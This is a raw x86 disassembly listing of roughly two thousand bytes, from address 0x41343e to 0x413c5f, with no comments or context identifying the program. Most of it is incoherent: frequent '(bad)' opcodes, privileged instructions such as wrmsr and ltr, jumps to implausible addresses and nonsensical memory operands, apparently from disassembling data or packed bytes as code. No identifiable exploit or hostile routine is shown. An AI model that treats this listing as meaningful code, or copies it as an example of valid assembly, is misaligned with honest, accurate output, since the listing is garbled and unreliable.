  41343e:	mov    BYTE PTR [ebp+0x45009c01],cl
  413444:	shl    BYTE PTR [eax],0x55
  413447:	push   cx
  413449:	mov    bx,0x7245
  41344d:	gs add bh,al
  413450:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  413457:	inc    ebp
  413458:	dec    ebp
  413459:	into   
  41345a:	mov    esp,ebx
  41345c:	jl     0x413425
  41345e:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  413465:	inc    ebp
  413466:	mov    edi,ebx
  413468:	add    ebp,esp
  41346a:	add    BYTE PTR [esi+0x1],ah
  41346d:	inc    ebp
  41346e:	or     BYTE PTR [edi],bh
  413470:	inc    ebp
  413471:	(bad)  
  413472:	in     eax,dx
  413473:	fsubr  st(4),st
  413475:	inc    edi
  413477:	add    dl,al
  413479:	add    al,ah
  41347b:	call   0x864cf0
  413480:	pop    esi
  413481:	test   DWORD PTR [eax],ecx
  413483:	dec    dl
  413485:	(bad)  
  413486:	jmp    0x413fbd10
  41348b:	push   DWORD PTR [ebp-0x75]
  41348e:	(bad)  
  41348f:	loopne 0x41345d
  413491:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  41349b:	push   eax
  41349c:	inc    DWORD PTR [ebp-0x75]
  41349f:	mov    esp,eax
  4134a1:	cwde   
  4134a2:	mov    DWORD PTR [eax],0xff8bffc3
  4134a8:	sbb    al,0x8
  4134aa:	ror    BYTE PTR [ebp+0x50],0x51
  4134ae:	inc    ebp
  4134af:	ror    BYTE PTR [ebx+0x65987d],1
  4134b5:	test   edi,eax
  4134b7:	add    al,0xdc
  4134b9:	add    bh,bh
  4134bb:	push   0x1
  4134bd:	add    BYTE PTR [eax],al
  4134bf:	mov    edi,edi
  4134c1:	inc    WORD PTR [ebp+0x8]
  4134c5:	add    eax,0xd
  4134c8:	(bad)  
  4134ca:	xor    eax,0x782ec89
  4134cf:	push   ecx
  4134d0:	cli    
  4134d1:	popw   es
  4134d3:	push   ebp
  4134d4:	xchg   BYTE PTR [ebx-0x76740800],al
  4134da:	sbb    al,0x86
  4134dc:	test   DWORD PTR [ecx-0x2],edx
  4134df:	call   WORD PTR [ebp-0x40]
  4134e3:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  4134e7:	mov    eax,ebx
  4134e9:	mov    dh,BYTE PTR ds:0xc7666851
  4134ef:	push   ebp
  4134f0:	fsub   QWORD PTR [esi+0x0]
  4134f3:	dec    ebp
  4134f4:	inc    ebp
  4134f5:	mov    edx,0xec4ec0
  4134fa:	(bad)  
  4134fb:	retf   0x89a0
  4134fe:	fist   DWORD PTR [eax+0x454ae1]
  413504:	jmp    0xa8b5:0xc7663e8b
  41350b:	jmp    edx
  41350d:	(bad)  
  41350e:	in     eax,dx
  41350f:	lock (bad) 
  413511:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  413518:	(bad)  
  413519:	xor    eax,0x700089ff
  41351e:	add    bh,bh
  413520:	stos   DWORD PTR es:[edi],eax
  413521:	data16 add BYTE PTR [ebp-0x1b0077],al
  413528:	inc    DWORD PTR [ecx-0x73]
  41352b:	data16 fadd QWORD PTR [ebp-0xaf0001]
  413532:	inc    ebp
  413533:	shl    BYTE PTR [ebx],0x66
  413536:	add    eax,DWORD PTR [ebp-0xba00b0]
  41353c:	add    DWORD PTR [ecx+0x44],0x66
  413540:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  413546:	add    DWORD PTR [ecx-0xcf8600],ecx
  41354c:	push   ebp
  41354d:	lea    dx,[ebp-0x28]
  413554:	add    BYTE PTR [ebp-0x25],0xf
  413558:	jge    0xff42345f
  41355e:	mov    ecx,0xc34fc7
  413563:	rol    ecx,0x89
  413566:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  41356a:	ror    BYTE PTR [ebx-0x48990775],0x55
  413571:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  413578:	test   BYTE PTR [ecx-0x3f997f3e],cl
  41357e:	push   ebp
  41357f:	mov    DWORD PTR [ebp-0x76761480],ecx
  413585:	or     BYTE PTR [eax+0x6600c265],0x45
  41358c:	push   ebp
  41358d:	xor    DWORD PTR [ebp-0x76381e64],ecx
  413593:	aam    0x8c
  413595:	test   DWORD PTR [ecx-0x3dba7108],ecx
  41359b:	cmp    eax,0xc78b9c00
  4135a0:	data16 hlt 
  4135a2:	dec    ebp
  4135a3:	test   DWORD PTR [ecx+0x454ff8],edi
  4135a9:	xor    ecx,esi
  4135ab:	lahf   
  4135ac:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  4135b2:	mov    eax,DWORD PTR [ecx]
  4135b4:	data16 add BYTE PTR [ebp-0x7400bb],dh
  4135bb:	sbb    al,0x71
  4135bd:	dec    ebp
  4135be:	mov    si,WORD PTR [ebp-0xff0074]
  4135c5:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  4135cb:	add    BYTE PTR [ebp-0x760fd477],cl
  4135d1:	jne    0x413647
  4135d3:	test   edi,edi
  4135d5:	jne    0x41355a
  4135d7:	(bad)  
  4135d8:	sti    
  4135d9:	sbb    BYTE PTR [ecx-0x1789ab],cl
  4135df:	cld    
  4135e0:	(bad)  
  4135e1:	jmp    DWORD PTR [ecx]
  4135e3:	inc    ebp
  4135e4:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  4135ea:	data16 cmp al,0x8d
  4135ed:	push   cs
  4135ee:	inc    DWORD PTR [ebp-0x1]
  4135f1:	test   DWORD PTR [ecx-0x838c],ecx
  4135f7:	sbb    al,0x8b
  4135f9:	lock clc 
  4135fb:	push   DWORD PTR [edi-0xe39375]
  413601:	xor    BYTE PTR [ebx],0x1
  413604:	add    eax,DWORD PTR [eax]
  413606:	xor    eax,DWORD PTR [eax]
  413608:	mov    WORD PTR [ebp-0xba003d],0x4575
  413611:	mov    ecx,DWORD PTR [edi]
  413613:	sbb    al,0x4d
  413615:	mov    DWORD PTR [ebx],esi
  413617:	add    DWORD PTR [ebx],eax
  413619:	add    BYTE PTR [ebx],dh
  41361b:	xor    DWORD PTR [esi-0x80],esp
  41361e:	inc    ebp
  41361f:	add    DWORD PTR [ebx],esi
  413621:	add    BYTE PTR [esi+0x50],ah
  413624:	inc    ebp
  413625:	jmp    0x863890
  41362a:	add    DWORD PTR [eax+0xc70194],0xffffffec
  413631:	or     BYTE PTR [ebp+0x4501f845],dh
  413637:	jmp    0xdd392d
  41363c:	(bad)  
  41363d:	push   cs
  41363e:	in     al,0xc9
  413640:	test   DWORD PTR [ebp+0x4502f8],eax
  413646:	xor    ecx,DWORD PTR [ebp-0x64]
  413649:	mov    eax,edi
  41364b:	mov    esp,esp
  41364d:	push   eax
  41364e:	add    eax,0x45fff885
  413653:	dec    DWORD PTR [ebx+0x339445]
  413659:	add    ecx,DWORD PTR [ecx+0x452ce889]
  41365f:	dec    DWORD PTR [ebx-0x4e0be375]
  413665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413666:	add    edi,edi
  413668:	add    bh,bh
  41366a:	push   cs
  41366b:	xor    eax,DWORD PTR [eax+0x890103]
  413671:	xor    BYTE PTR [ebp-0x1],al
  413674:	mov    DWORD PTR [ebp-0x36df38],ecx
  41367a:	push   cs
  41367b:	push   eax
  41367c:	jne    0x4136c3
  41367e:	mov    esi,DWORD PTR [ebx]
  413680:	sbb    al,0x3
  413682:	jne    0x4136d4
  413684:	inc    DWORD PTR [ebp-0x75]
  413687:	add    eax,0x800f0
  41368c:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  413692:	mov    DWORD PTR [ecx],eax
  413694:	sbb    BYTE PTR [eax],al
  413696:	leave  
  413697:	test   DWORD PTR [edi-0x1],eax
  41369a:	jne    0x41369b
  41369c:	call   0xff4221a1
  4136a1:	xor    BYTE PTR [ebp+0x4d],al
  4136a4:	mov    edi,edi
  4136a6:	enter  0x8,0x4d
  4136aa:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  4136b0:	mov    eax,DWORD PTR [eax]
  4136b2:	sbb    al,0x1
  4136b4:	sbb    DWORD PTR [ebp+0x4d],eax
  4136b7:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  4136bd:	inc    eax
  4136be:	dec    DWORD PTR [ecx-0x27d775]
  4136c4:	add    BYTE PTR [ebx-0x38d72b01],cl
  4136ca:	xchg   ecx,eax
  4136cb:	ret    
  4136cc:	add    BYTE PTR [ebp-0x830075],al
  4136d2:	add    BYTE PTR [ebp-0x75],al
  4136d5:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  4136db:	lea    edi,[edi+0x20]
  4136de:	add    bh,bh
  4136e0:	mov    edx,DWORD PTR [eax-0x7b]
  4136e3:	inc    ebp
  4136e4:	rdpmc  
  4136e6:	jne    0x4136eb
  4136e8:	add    BYTE PTR [eax-0x75],dl
  4136eb:	inc    ebp
  4136ec:	call   0x40413ff6
  4136f1:	add    BYTE PTR [ecx-0xe3d775],cl
  4136f7:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  4136fe:	ret    
  4136ff:	inc    DWORD PTR [ebp-0xff0001]
  413705:	add    BYTE PTR [ebp-0x4b],al
  413708:	cmp    edi,0x24
  41370b:	(bad)  
  41370c:	push   DWORD PTR [eax]
  41370e:	add    BYTE PTR [ebp-0x39],dl
  413711:	test   ebx,eax
  413713:	je     0x41369a
  413715:	mov    edi,edi
  413717:	sbb    bh,bh
  413719:	test   DWORD PTR gs:[eax],eax
  41371c:	(bad)  
  41371d:	js     0x41371e
  41371f:	add    BYTE PTR [ebx-0x38b21fdd],cl
  413725:	sub    eax,ebx
  413727:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  41372d:	add    eax,DWORD PTR [eax]
  41372f:	dec    ebp
  413730:	push   eax
  413731:	mov    al,BYTE PTR [ebp+0x1]
  413734:	mov    eax,DWORD PTR [ebp-0x68]
  413737:	mov    eax,DWORD PTR [eax]
  413739:	cld    
  41373a:	(bad)  
  41373b:	or     BYTE PTR [eax],ah
  41373d:	dec    ebp
  41373e:	inc    DWORD PTR [eax+0x4]
  413741:	push   ecx
  413742:	add    BYTE PTR [edx-0x1],dh
  413745:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  41374b:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  413755:	add    ecx,DWORD PTR [ecx-0xf037477]
  41375b:	push   ecx
  41375c:	xor    BYTE PTR [ebx],al
  41375e:	inc    ebp
  41375f:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  413765:	(bad)  
  413766:	push   eax
  413768:	inc    DWORD PTR [eax]
  41376a:	inc    ebp
  41376b:	add    BYTE PTR [ebx],dh
  41376d:	add    BYTE PTR [ebx],0x0
  413770:	mov    DWORD PTR [ebx-0x150007d4],eax
  413776:	lea    edx,[ebp-0x6c]
  413779:	je     0x413700
  41377b:	(bad)  
  41377c:	dec    DWORD PTR [eax]
  41377e:	call   DWORD PTR [ebp-0x7b]
  413781:	mov    edi,edi
  413783:	hlt    
  413784:	call   DWORD PTR [ebp-0x75]
  413787:	mov    esp,eax
  413789:	cwde   
  41378a:	(bad)  
  41378b:	mov    bh,0xc3
  41378d:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  413793:	add    DWORD PTR [eax],0x450050ff
  413799:	mov    DWORD PTR [ebx+0x9598c8],ecx
  41379f:	inc    edi
  4137a1:	jmp    DWORD PTR [eax]
  4137a3:	jmp    0xcd00:0x640481ff
  4137aa:	mov    DWORD PTR [ebx],esi
  4137ac:	and    al,0x81
  4137ae:	push   DWORD PTR [edx]
  4137b0:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  4137b7:	add    esi,DWORD PTR [eax]
  4137b9:	enter  0x3c45,0x83
  4137bd:	add    ah,bh
  4137bf:	adc    DWORD PTR [ebx+0x768b5055],eax
  4137c5:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  4137cb:	mov    esi,eax
  4137cd:	xor    BYTE PTR [ebp+0x45],cl
  4137d0:	jmp    0x41375d
  4137d2:	mov    ebx,DWORD PTR [eax]
  4137d4:	in     al,dx
  4137d5:	inc    ebp
  4137d6:	or     al,0x2
  4137d8:	dec    DWORD PTR [ebp-0x4]
  4137db:	jne    0x413832
  4137dd:	mov    ecx,DWORD PTR [eax+0x18558be8]
  4137e3:	mov    edi,DWORD PTR [ebx]
  4137e5:	lock push eax
  4137e7:	xchg   ecx,eax
  4137e8:	jmp    0x34185ed
  4137ed:	adc    al,0x8b
  4137ef:	inc    ebp
  4137f0:	mov    al,ds:0x8b04008b
  4137f5:	push   ebp
  4137f6:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  4137fc:	push   ebp
  4137fd:	test   DWORD PTR [ebx-0x2900d701],ecx
  413803:	inc    ebp
  413804:	dec    ebp
  413805:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  41380b:	mov    DWORD PTR [eax],0xe9ff0020
  413811:	add    al,0x0
  413813:	add    BYTE PTR [eax],al
  413815:	mov    eax,edx
  413817:	push   eax
  413818:	rol    DWORD PTR [ebp-0xb0077],1
  41381e:	bound  eax,QWORD PTR [ebp+0x50]
  413821:	xor    ecx,DWORD PTR [ecx+0x55899803]
  413827:	sub    al,0x89
  413829:	push   esp
  41382b:	lea    edx,[ebp-0x6c]
  41382e:	jne    0xffd73746
  413834:	inc    DWORD PTR [ebp-0x1d0001]
  41383a:	jnp    0xc7971840
  413840:	mov    eax,ebx
  413842:	fs mov edi,edi
  413845:	sbb    al,0xc1
  413847:	out    dx,al
  413848:	or     al,0x0
  41384a:	ret    0x8d50
  41384d:	inc    ebp
  41384e:	dec    DWORD PTR [ebx+0xfa98d7]
  413854:	test   edi,edi
  413856:	clc    
  413857:	call   FWORD PTR [edi]
  413859:	or     BYTE PTR [eax],cl
  41385b:	inc    ebp
  41385c:	dec    ebp
  41385d:	inc    DWORD PTR [ebx+0x74803114]
  413863:	add    DWORD PTR [ebx+0x45fc00],ecx
  413869:	call   DWORD PTR [eax+edx*1]
  41386c:	add    ecx,DWORD PTR [ebp-0x38]
  41386f:	push   esi
  413870:	adc    al,0x8
  413872:	mov    edx,DWORD PTR [ebp-0x14]
  413875:	mov    ecx,DWORD PTR [ebp-0x4]
  413878:	add    DWORD PTR [ebp-0x68],0xffffff8d
  41387c:	inc    DWORD PTR [esp+esi*8]
  41387f:	inc    ebp
  413880:	stos   BYTE PTR es:[edi],al
  413881:	mov    edx,DWORD PTR [ebp+0x1c]
  413884:	add    DWORD PTR [ebp-0x10],eax
  413887:	mov    edx,DWORD PTR [ebp-0x70]
  41388a:	cmp    eax,DWORD PTR [eax]
  41388c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41388d:	mov    eax,DWORD PTR [eax]
  41388f:	sbb    al,0x73
  413891:	add    BYTE PTR [ebx],0x1
  413894:	call   0x89718899
  413899:	xor    eax,ebp
  41389b:	pop    ds
  41389c:	inc    ebp
  41389d:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  4138a3:	(bad)  
  4138a4:	push   DWORD PTR [edi]
  4138a6:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  4138ac:	push   DWORD PTR [ebx-0x1]
  4138af:	mov    eax,DWORD PTR [ebp-0x740075]
  4138b5:	sub    eax,DWORD PTR [eax]
  4138b7:	add    eax,DWORD PTR [eax]
  4138b9:	mov    DWORD PTR [ecx+0x5f],eax
  4138bc:	mov    DWORD PTR [ebx+0x28],ebx
  4138bf:	ret    0xff
  4138c2:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  4138c8:	ret    
  4138c9:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4138cf:	add    BYTE PTR [ebp-0x7d],al
  4138d2:	mov    DWORD PTR [eax],eax
  4138d4:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  4138db:	sar    bh,cl
  4138dd:	test   BYTE PTR [eax+0x1],dl
  4138e0:	inc    ebp
  4138e1:	add    BYTE PTR [ebx],dh
  4138e3:	test   BYTE PTR [ebx],0x84
  4138e6:	push   eax
  4138e7:	add    BYTE PTR [ebp+0x0],al
  4138ea:	add    eax,0x86
  4138ef:	add    BYTE PTR [ebx-0x7f7be340],cl
  4138f5:	add    BYTE PTR [ecx],al
  4138f7:	add    BYTE PTR [eax],al
  4138f9:	mov    esi,0x550030
  4138fe:	mov    ecx,DWORD PTR [edi]
  413900:	sbb    al,0xda
  413902:	jne    0x413904
  413904:	mov    edi,DWORD PTR [ecx]
  413906:	xor    BYTE PTR [eax+eax*1],0x84
  41390a:	add    eax,DWORD PTR [eax]
  41390c:	cld    
  41390d:	add    BYTE PTR [ebp-0x4f],dh
  413910:	mov    eax,DWORD PTR [ecx]
  413912:	cld    
  413913:	add    BYTE PTR [ecx-0x1bff009b],cl
  413919:	retf   0xe45
  41391c:	add    eax,edx
  41391e:	sbb    al,0xb7
  413920:	dec    ebp
  413921:	or     al,0x89
  413923:	dec    ebp
  413924:	sbb    al,0xf
  413926:	inc    ebp
  413927:	dec    eax
  413928:	mov    eax,DWORD PTR [ebx]
  41392a:	sbb    al,0xf
  41392c:	nop
  41392d:	scas   al,BYTE PTR es:[edi]
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [ebp-0x7674ebbb],cl
  413936:	mov    eax,gs
  413938:	add    bh,bh
  41393a:	mov    edi,edi
  41393c:	cmp    DWORD PTR [edi+0x72],edx
  41393f:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  413945:	gs cmp al,0x0
  413948:	je     0x413920
  41394a:	push   eax
  41394b:	sar    BYTE PTR [eax],1
  41394d:	mov    bh,0x3e
  41394f:	push   cs
  413950:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  413956:	add    DWORD PTR [ecx+0x12],ebp
  413959:	dec    edx
  41395a:	(bad)  
  41395b:	mov    eax,edx
  41395d:	in     al,dx
  41395e:	adc    DWORD PTR [ecx],esi
  413960:	pop    esi
  413961:	inc    ecx
  413962:	leave  
  413963:	or     DWORD PTR [eax],ebx
  413965:	gs push ebp
  413967:	add    ah,ch
  413969:	into   
  41396a:	in     al,dx
  41396b:	enter  0xb756,0xf0
  41396f:	push   cs
  413970:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  41397a:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  413980:	jnp    0x7441be88
  413986:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  41398c:	add    BYTE PTR [edi],cl
  41398e:	mov    edi,DWORD PTR [ecx-0x78]
  413991:	ltr    WORD PTR [ecx-0x7b]
  413995:	dec    DWORD PTR [edi]
  413997:	clc    
  413998:	out    0x45,eax
  41399a:	add    BYTE PTR [eax],cl
  41399c:	cmp    ebx,0xffffff8c
  41399f:	jge    0x4139a1
  4139a1:	jb     0x4139b3
  4139a3:	je     0x503a23
  4139a9:	pop    edx
  4139aa:	push   esi
  4139ab:	mov    ecx,DWORD PTR [edi]
  4139ad:	in     al,dx
  4139ae:	rol    DWORD PTR [ebp+0x0],1
  4139b1:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  4139b8:	cmp    DWORD PTR [ecx],0xfffffff0
  4139bb:	hlt    
  4139bc:	mov    esp,DWORD PTR [eax+0xf034d2b]
  4139c2:	(bad)  
  4139c4:	push   eax
  4139c5:	jns    0xb8411e43
  4139cb:	lock push cs
  4139cd:	ror    edx,0x3
  4139d0:	test   BYTE PTR [ecx+0x5500e800],cl
  4139d6:	dec    eax
  4139d7:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4139db:	(bad)  
  4139dc:	mov    esi,0x7f33ff5f
  4139e1:	inc    eax
  4139e2:	test   DWORD PTR [edx],eax
  4139e4:	je     0x4139a6
  4139e6:	mov    ecx,ecx
  4139e8:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4139ec:	and    eax,DWORD PTR [eax+0xf0103]
  4139f2:	jp     0x4139e0
  4139f4:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4139f8:	add    edx,DWORD PTR [edi+0x74]
  4139fb:	sbb    BYTE PTR [ebp+0x4d001484],cl
  413a01:	add    BYTE PTR [ebp-0x74c48bbb],al
  413a07:	je     0x41398c
  413a09:	cmp    eax,edi
  413a0b:	js     0x413a30
  413a0d:	add    eax,0xeb0fc003
  413a12:	jns    0x41399f
  413a14:	vmread DWORD PTR [ecx+0x45],ebx
  413a18:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  413a1e:	adc    al,0x8b
  413a20:	jge    0x413a36
  413a22:	mov    edi,DWORD PTR [eax-0x4]
  413a25:	add    edi,DWORD PTR [edi]
  413a27:	or     bh,bh
  413a29:	push   ebp
  413a2a:	push   es
  413a2b:	mov    DWORD PTR [ebp-0x4],ebx
  413a2e:	add    edi,esi
  413a30:	pop    es
  413a31:	add    esi,DWORD PTR [edi-0x48ccf183]
  413a37:	mov    DWORD PTR [esp+esi*8],ecx
  413a3a:	inc    ebp
  413a3b:	pop    ebp
  413a3c:	xor    DWORD PTR [esi-0x4],0x3b
  413a40:	add    edx,DWORD PTR [ecx+edi*1]
  413a43:	push   es
  413a44:	clc    
  413a45:	mov    bh,0xdb
  413a47:	jp     0x413a00
  413a49:	add    cl,BYTE PTR [esi]
  413a4b:	div    DWORD PTR [edi+0x4d8b0c1c]
  413a51:	test   edi,edi
  413a53:	je     0x413a49
  413a55:	mov    eax,ecx
  413a57:	or     BYTE PTR [ebx],al
  413a59:	dec    BYTE PTR [ecx+0x7d3bec7d]
  413a5f:	jbe    0x413ad3
  413a61:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  413a67:	add    ecx,DWORD PTR [esi]
  413a69:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  413a6f:	add    eax,DWORD PTR [ebx-0x287af783]
  413a75:	je     0x413ac4
  413a77:	mov    DWORD PTR [ecx],edi
  413a79:	mov    esi,eax
  413a7b:	hlt    
  413a7c:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  413a83:	jb     0x413a45
  413a85:	jmp    0x413a72
  413a87:	xor    esi,DWORD PTR [ebx]
  413a89:	pop    edi
  413a8a:	pop    esi
  413a8b:	pop    ebx
  413a8c:	ret    
  413a8d:	ret    0x8b
  413a90:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  413a96:	xor    DWORD PTR [ecx],0xc
  413a99:	pushf  
  413a9a:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  413aa0:	wrmsr  
  413aa2:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  413aa9:	dec    ebp
  413aaa:	ret    
  413aab:	mov    edi,DWORD PTR [esi-0x4]
  413aae:	pop    eax
  413aaf:	dec    ebp
  413ab0:	jne    0x413a3d
  413ab2:	xor    edi,esp
  413ab4:	inc    eax
  413ab5:	dec    ebp
  413ab6:	jbe    0x413b0b
  413ab8:	inc    eax
  413ab9:	pop    ebp
  413aba:	add    edx,DWORD PTR [esi+0x8]
  413abd:	push   ebp
  413abe:	dec    eax
  413abf:	push   ecx
  413ac0:	mov    eax,edi
  413ac2:	and    al,0xf0
  413ac4:	jo     0x413ab1
  413ac6:	mov    eax,DWORD PTR [ebx]
  413ac8:	sbb    BYTE PTR [ebp+0x4d],cl
  413acb:	mov    eax,DWORD PTR [ebx]
  413acd:	nop
  413ace:	or     BYTE PTR [eax],al
  413ad0:	jne    0x413b29
  413ad2:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  413ad9:	xor    edi,edi
  413adb:	add    edi,DWORD PTR [ebp+0x3]
  413ade:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  413ae4:	js     0x413a6a
  413ae6:	jae    0x413aea
  413ae8:	(bad)  
  413aea:	xor    al,0x5d
  413aec:	jmp    0x413a79
  413aee:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  413af5:	fdecstp 
  413af7:	test   BYTE PTR [edi],ah
  413af9:	add    bh,BYTE PTR [ebp+0x0]
  413afc:	add    ebx,DWORD PTR [ebp-0x77]
  413aff:	mov    edi,eax
  413b01:	cmp    al,0x0
  413b04:	adc    dh,BYTE PTR [ebx]
  413b06:	jge    0x413b0b
  413b08:	mov    edi,DWORD PTR [ebx]
  413b0a:	jl     0x413b1b
  413b0c:	clc    
  413b0d:	dec    edi
  413b0e:	jge    0x413b10
  413b10:	mov    eax,DWORD PTR [ebx]
  413b12:	jb     0x413b1c
  413b14:	mov    ecx,DWORD PTR [ebp-0x8]
  413b17:	mov    edi,edi
  413b19:	xor    edx,DWORD PTR [eax]
  413b1b:	add    edi,DWORD PTR [ebx]
  413b1d:	mov    DWORD PTR [ebp-0x10],edi
  413b20:	inc    edi
  413b21:	pop    ebp
  413b22:	jge    0x413b5f
  413b24:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  413b28:	mov    edx,0xc05d87f0
  413b2d:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  413b31:	fimul  WORD PTR [eax]
  413b33:	fist   WORD PTR [ebp+0x1c]
  413b36:	in     al,dx
  413b37:	jne    0x413b25
  413b39:	mov    edi,DWORD PTR [edx-0x7a27a10]
  413b3f:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  413b43:	fdivp  st(0),st
  413b45:	fild   WORD PTR [ebp+0x4510f85c]
  413b4b:	test   BYTE PTR [ebx+0x4d00fc02],cl
  413b51:	inc    ebp
  413b52:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  413b58:	mov    ebp,DWORD PTR [ebx-0x4]
  413b5b:	adc    al,0x8b
  413b5d:	rcl    DWORD PTR [eax],0x48
  413b60:	mov    esi,0x7080803
  413b65:	fiadd  WORD PTR [ebp+0x4d]
  413b68:	(bad)  
  413b69:	mov    edx,DWORD PTR [edx-0x4]
  413b6c:	mov    edx,DWORD PTR [ebp-0x4]
  413b6f:	xor    ebx,DWORD PTR [ebx+0x330103]
  413b75:	mov    DWORD PTR [edi+0x872dc],edi
  413b7b:	xlat   BYTE PTR ds:[ebx]
  413b7c:	into   
  413b7d:	ffreep st(6)
  413b7f:	retf   0x6c7
  413b82:	iret   
  413b83:	dec    ebp
  413b84:	inc    ebp
  413b85:	mov    DWORD PTR [ebx],edi
  413b87:	fmul   QWORD PTR [edi]
  413b89:	dec    ebp
  413b8a:	jnp    0x413bbf
  413b8c:	add    BYTE PTR [ebx],al
  413b8e:	mov    ecx,DWORD PTR [esp+edi*8]
  413b91:	inc    ebp
  413b92:	dec    ebp
  413b93:	lea    esi,[ebx]
  413b95:	add    DWORD PTR [ebx],eax
  413b97:	jb     0x413bd4
  413b99:	add    BYTE PTR [edi],cl
  413b9b:	inc    ebp
  413b9c:	imul   eax,edi,0x858bd800
  413ba2:	cld    
  413ba3:	clc    
  413ba4:	mov    DWORD PTR [ebp+0x0],eax
  413ba7:	inc    DWORD PTR [eax]
  413ba9:	or     al,0xde
  413bab:	sbb    bh,0x1
  413bae:	retf   
  413baf:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  413bb6:	dec    ebp
  413bb7:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  413bbd:	enter  0x12de,0xdf
  413bc1:	inc    ebp
  413bc2:	pop    ebp
  413bc3:	dec    DWORD PTR [ebx-0x257f0ff4]
  413bc9:	add    DWORD PTR [edx],edx
  413bcb:	add    BYTE PTR [ebp+0x50],dl
  413bce:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  413bd4:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  413bda:	or     ah,al
  413bdc:	pop    ss
  413bdd:	cdq    
  413bde:	push   ebp
  413bdf:	clc    
  413be0:	mov    eax,DWORD PTR [ebp-0x4]
  413be3:	xor    edx,edx
  413be5:	add    esi,DWORD PTR [ebx]
  413be7:	cmp    eax,DWORD PTR [ebx]
  413be9:	hlt    
  413bea:	cmp    DWORD PTR [ebx],esp
  413bec:	or     al,BYTE PTR [ebp+0xf]
  413bef:	mov    eax,DWORD PTR [edx]
  413bf1:	loopne 0x413bf3
  413bf3:	(bad)  
  413bf4:	mov    ecx,esi
  413bf6:	cld    
  413bf7:	pushf  
  413bf8:	pop    ebp
  413bf9:	pushf  
  413bfa:	mov    esi,DWORD PTR [edx]
  413bfc:	lock mov eax,eax
  413bff:	adc    BYTE PTR [ebx],al
  413c01:	or     BYTE PTR [ebx+0x4d001001],0xcf
  413c08:	xor    ebp,DWORD PTR [edi+0x50e45189]
  413c0e:	dec    ebp
  413c0f:	mov    ecx,DWORD PTR [ebx-0x31390304]
  413c15:	(bad)  
  413c16:	iret   
  413c17:	inc    ebp
  413c18:	(bad)  
  413c19:	jne    0x413c68
  413c1b:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  413c21:	(bad)  
  413c22:	cmp    ebx,eax
  413c24:	je     0x413bac
  413c26:	add    edi,edi
  413c28:	or     bh,bh
  413c2a:	dec    ebp
  413c2b:	inc    ebp
  413c2c:	mov    esi,DWORD PTR [ebx]
  413c2e:	cld    
  413c2f:	add    ecx,esi
  413c31:	cmp    ecx,DWORD PTR [eax-0xc]
  413c34:	mov    edx,DWORD PTR [edi]
  413c36:	or     BYTE PTR [ebp-0x7c],al
  413c39:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  413c40:	or     al,0x9c
  413c42:	inc    ebp
  413c43:	xor    bh,BYTE PTR [ecx+ecx*4]
  413c46:	pushf  
  413c47:	call   0x522bd7
  413c4c:	jne    0x413c15
  413c4e:	mov    ebp,esp
  413c50:	fcomp  DWORD PTR [ebx]
  413c52:	add    BYTE PTR [ecx],al
  413c54:	inc    DWORD PTR [ebp-0x75]
  413c57:	(bad)  
  413c58:	cld    
  413c59:	add    al,0xce
  413c5b:	mov    ecx,edi
  413c5d:	cld    
  413c5e:	inc    ebp
  413c5f:	fidivr WORD PTR [ebx]
